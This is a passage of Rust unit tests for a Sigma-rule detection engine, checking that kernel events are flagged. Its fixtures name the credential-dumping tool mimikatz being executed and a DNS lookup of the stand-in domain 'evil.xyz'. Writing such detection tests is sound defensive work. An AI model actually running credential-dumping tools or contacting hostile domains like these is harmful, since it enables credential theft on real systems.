            id: 1,
            timestamp_ms: 1000,
            source: EventSource::EbpfLinux,
            hostname: "test-host".into(),
            agent_uid: None,
            kind: KernelEventKind::ProcessExec {
                pid: 100,
                ppid: 1,
                uid: 0,
                exe: "/usr/bin/mimikatz.exe".into(),
                args: vec![],
                cwd: "/tmp".into(),
                container_id: None,
            },
            severity: KernelEventSeverity::High,
            mitre_techniques: vec![],
        };

        let matches = evaluate_kernel_event(&mut engine, &ke, 1000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-002"),
            "Should detect credential dumping tool via kernel event bridge"
        );
    }

    #[test]
    fn sigma_kernel_bridge_dns() {
        use crate::kernel_events::*;

        let mut engine = SigmaEngine::new();
        engine.load_rules(builtin_rules());

        let ke = KernelEvent {
            id: 2,
            timestamp_ms: 2000,
            source: EventSource::EbpfLinux,
            hostname: "h".into(),
            agent_uid: None,
            kind: KernelEventKind::DnsQuery {
                pid: 50,
                domain: "evil.xyz".into(),
                query_type: "A".into(),
                response_addrs: vec!["1.2.3.4".into()],
            },
            severity: KernelEventSeverity::Medium,
            mitre_techniques: vec![],
        };

        let matches = evaluate_kernel_event(&mut engine, &ke, 2000);
        assert!(
            matches.iter().any(|m| m.rule_id == "SE-005"),
            "Should detect suspicious TLD via kernel event bridge"
        );
    }
}
